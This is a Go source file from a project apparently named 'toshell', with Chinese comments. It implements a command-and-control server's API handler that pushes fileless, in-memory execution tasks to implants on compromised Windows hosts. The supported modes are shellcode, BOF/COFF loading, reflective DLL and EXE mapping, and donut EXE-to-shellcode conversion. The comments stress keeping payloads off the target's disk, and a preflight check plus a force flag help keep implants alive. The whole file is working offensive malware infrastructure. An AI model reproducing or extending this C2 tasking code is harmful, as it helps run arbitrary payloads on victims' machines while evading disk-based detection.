package api

import (
	"encoding/base64"
	"encoding/json"
	"net/http"

	"github.com/gorilla/mux"
	"toshell/internal/server/builder"
	"toshell/internal/server/logging"
)

// filelessExecRequest 全内存无文件执行请求。
//
// kind:
//   - shellcode：payload_b64 直接作为 shellcode 下发，VirtualAlloc + CreateThread；
//   - bof：内存 COFF 执行，args 作为 BOF 参数；
//   - dll：反射式 PE 加载（映射 + 重定位 + 导入表），entry 指定导出函数；
//   - exe：服务端用 donut 把 EXE 转成位置无关 shellcode 再下发，args 作为被转换
//     程序的命令行（donut 上限 255 字节）；需要 64 位 donut 时可 arch=amd64；
//   - exe_mem：**不走 donut**，直接由植入端反射式映射执行 EXE（要求 EXE 与植入体
//     同架构），args 通过 PEB 命令行注入；wait_ms > 0 时等线程结束并回传退出码。
type filelessExecRequest struct {
	Kind       string `json:"kind"`
	PayloadB64 string `json:"payload_b64"`
	Args       string `json:"args"`    // BOF 参数 / EXE 命令行 / DLL 导出参数
	Entry      string `json:"entry"`   // DLL 导出函数名 / EXE 镜像名（argv[0]）
	Arch       string `json:"arch"`    // exe→shellcode 转换时指定目标架构
	WaitMs     int    `json:"wait_ms"` // exe_mem：等待执行线程结束的毫秒数（0=不等待）
	// Force 跳过 PE 预检的 reject 阻断，强制下发（高危：可能崩掉宿主植入体，服务端会记日志留痕）。
	Force bool `json:"force"`
}

// writeFilelessJSON 输出 JSON 响应（Content-Type 已由 handler 设为 application/json）。
func writeFilelessJSON(w http.ResponseWriter, status int, payload map[string]interface{}) {
	w.WriteHeader(status)
	_ = json.NewEncoder(w).Encode(payload)
}

func (s *Server) filelessExecHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]

	var req filelessExecRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, `{"error":"Invalid request body"}`, http.StatusBadRequest)
		return
	}
	if req.PayloadB64 == "" {
		http.Error(w, `{"error":"payload_b64 is required"}`, http.StatusBadRequest)
		return
	}
	// 会话不存在 → 404、listener 未就绪 → 503：别把「客户端 id 写错」报成 5xx 服务端故障
	// （语义约定见 handlers_session_guard.go）。
	if !s.requireSessionFromPath(w, r) {
		return
	}
	if !s.requireListener(w) {
		return
	}

	kind := req.Kind
	payloadB64 := req.PayloadB64

	// ------------------------- PE 预检（下发前判定） -------------------------
	//
	// exe_mem / dll 是植入端反射映射（同进程内跑），命中硬边界会直接崩宿主，
	// 因此 reject 时**不下发任务**，把结论前置到接口响应里；exe 走服务端 donut
	// 转换（转换本身有错误处理），预检只提示不阻断。
	//
	// 三条硬边界（见 ROADMAP P0-2）：Go 载荷双 runtime 冲突、TLS/CLR/复杂 CRT、
	// 架构不匹配。判定逻辑在 builder.CheckMemoryExec，这里只做接线与留痕。
	var (
		preflightRaw     []byte
		preflightVerdict string
		preflightSuggest string
		peSummary        *builder.PESummary
		warnings         []string
	)

	if kind == "exe_mem" || kind == "dll" || kind == "exe" {
		raw, err := base64.StdEncoding.DecodeString(payloadB64)
		if err != nil {
			http.Error(w, `{"error":"payload_b64 不是合法的 base64 编码，无法做 PE 预检"}`, http.StatusBadRequest)
			return
		}
		preflightRaw = raw

		info, perr := builder.InspectPE(raw)
		if perr != nil {
			// exe_mem / dll 必须拿到合法 PE 才能反射映射，直接拒绝。
			if kind != "exe" {
				writeFilelessJSON(w, http.StatusBadRequest, map[string]interface{}{
					"error":             "载荷预检失败：" + perr.Error(),
					"reasons":           []string{perr.Error()},
					"suggestion":        "确认上传的是 Windows PE 文件（EXE/DLL）；若载荷是原始 shellcode 请改用 kind=shellcode，若要在目标机落地执行请改用 upload + exec",
					"preflight_verdict": builder.VerdictReject,
				})
				logging.Warn("api", "fileless-exec 预检拒绝：载荷不是合法 PE (kind=%s session=%s): %v", kind, id, perr)
				return
			}
			// donut 只吃 PE，转换本身会报错，这里降级为警告后照常交给 donut 处理。
			warnings = append(warnings, "PE 预检未通过："+perr.Error()+"；donut 只接受 PE 文件，转换预计会失败")
			logging.Warn("api", "fileless-exec preflight: kind=%s 载荷不是合法 PE (session=%s): %v", kind, id, perr)
		} else {
			isGo, goEvidence := builder.DetectGoBinary(raw)
			hostArch := ""
			if sess, serr := s.sessionMgr.GetSessionInfo(id); serr == nil && sess != nil {
				hostArch = sess.Arch
			}
			verdict, reasons, suggestion := builder.CheckMemoryExec(info, isGo, hostArch, kind)
			logging.Info("api", "fileless-exec preflight: kind=%s verdict=%s machine=%s go=%v clr=%v tls=%v", kind, verdict, info.Machine, isGo, info.HasCLRDir, info.HasTLSDir)

			sum := info.Summary(isGo)
			peSummary = &sum
			preflightVerdict = verdict
			preflightSuggest = suggestion

			switch verdict {
			case builder.VerdictReject:
				if !req.Force {
					rejectBody := map[string]interface{}{
						"error":             "载荷预检未通过：该载荷不适合内存反射执行（" + kind + "），直接下发会导致宿主植入体崩溃或执行失败",
						"reasons":           reasons,
						"suggestion":        suggestion,
						"pe_info":           sum,
						"preflight_verdict": verdict,
					}
					if isGo {
						// 把「为什么判定是 Go」一并回传，操作员/前端可自行核对。
						rejectBody["go_evidence"] = goEvidence
					}
					writeFilelessJSON(w, http.StatusBadRequest, rejectBody)
					logging.Warn("api", "fileless-exec 预检拒绝下发: kind=%s session=%s machine=%s go=%v (%s) reasons=%v", kind, id, info.Machine, isGo, goEvidence, reasons)
					return
				}
				// 高危逃生门：操作员明确 force=true，照常下发但必须留痕 + 响应带 warnings。
				logging.Warn("api", "fileless-exec 操作员强制下发（force=true）: kind=%s session=%s machine=%s go=%v 被拒绝的原因=%v", kind, id, info.Machine, isGo, reasons)
				warnings = append(warnings, reasons...)
				warnings = append(warnings, "载荷预检判定为 reject，已被操作员强制下发（force=true）：目标机可能崩溃/掉线，请自行承担后果")
			case builder.VerdictWarn:
				warnings = append(warnings, reasons...)
				logging.Warn("api", "fileless-exec 预检警告（照常下发）: kind=%s session=%s machine=%s go=%v reasons=%v", kind, id, info.Machine, isGo, reasons)
			default:
				// ok：无额外提示
			}
		}
	}

	// exe → donut shellcode：在服务端完成转换，目标机全程不落盘
	if kind == "exe" {
		raw := preflightRaw
		if raw == nil {
			var err error
			raw, err = base64.StdEncoding.DecodeString(payloadB64)
			if err != nil {
				http.Error(w, `{"error":"payload_b64 is not valid base64"}`, http.StatusBadRequest)
				return
			}
		}
		arch := req.Arch
		if arch == "" {
			arch = "amd64"
		}
		sc, err := s.builder.ConvertToShellcodeWithParams(raw, arch, req.Args)
		if err != nil {
			http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
			return
		}
		payloadB64 = base64.StdEncoding.EncodeToString(sc)
		kind = "shellcode"
	}

	taskInfo, err := s.taskMgr.CreateFilelessExec(id, kind, payloadB64, req.Args, req.Entry, req.WaitMs)
	if err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	if err := s.listener.PushTask(id, taskInfo); err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}

	logging.Info("api", "fileless-exec (%s) pushed to session %s (args=%q entry=%q wait_ms=%d)", kind, id, req.Args, req.Entry, req.WaitMs)

	resp := map[string]interface{}{
		"task_id":   taskInfo.ID,
		"task_type": taskInfo.TaskType,
		"kind":      kind,
		"args":      req.Args,
		"message":   "fileless execution task pushed",
	}
	if len(warnings) > 0 {
		resp["warnings"] = warnings
	}
	if preflightSuggest != "" {
		resp["suggestion"] = preflightSuggest
	}
	if peSummary != nil {
		resp["pe_info"] = *peSummary
	}
	if preflightVerdict != "" {
		resp["preflight_verdict"] = preflightVerdict
	}
	_ = json.NewEncoder(w).Encode(resp)
}
